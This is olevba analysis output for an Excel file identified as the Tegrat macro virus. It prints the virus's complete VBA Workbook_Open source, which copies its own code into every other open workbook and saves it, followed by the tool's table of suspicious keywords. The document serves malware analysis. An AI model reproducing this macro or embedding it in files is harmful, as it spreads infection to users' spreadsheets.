olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Tegrat-c48117002e8a2aabea5a3be2faff2e7464cd0368
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Tegrat-c48117002e8a2aabea5a3be2faff2e7464cd0368 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Workbook_Open()
Application.EnableCancelKey = xlDisabled
Application.DisplayAlerts = Yes
TW = ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
If Workbooks.Count > 1 Then
For A = 1 To Workbooks.Count
With Workbooks.Item(A).VBProject.VBComponents.Item(1).CodeModule
If .CountOfLines > 1 Then Target = .Lines(1, .CountOfLines)
If Target <> TW Then
.DeleteLines 1, .CountOfLines
.AddFromString TW
Workbooks.Item(A).SaveAs FileName:=Workbooks.Item(A).FullName
End If
End With
Next
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO List1.cls 
in file: Virus.MSExcel.Tegrat-c48117002e8a2aabea5a3be2faff2e7464cd0368 - OLE stream: '_VBA_PROJECT_CUR/VBA/List1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO List2.cls 
in file: Virus.MSExcel.Tegrat-c48117002e8a2aabea5a3be2faff2e7464cd0368 - OLE stream: '_VBA_PROJECT_CUR/VBA/List2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO List3.cls 
in file: Virus.MSExcel.Tegrat-c48117002e8a2aabea5a3be2faff2e7464cd0368 - OLE stream: '_VBA_PROJECT_CUR/VBA/List3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  List
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  List
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  List
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

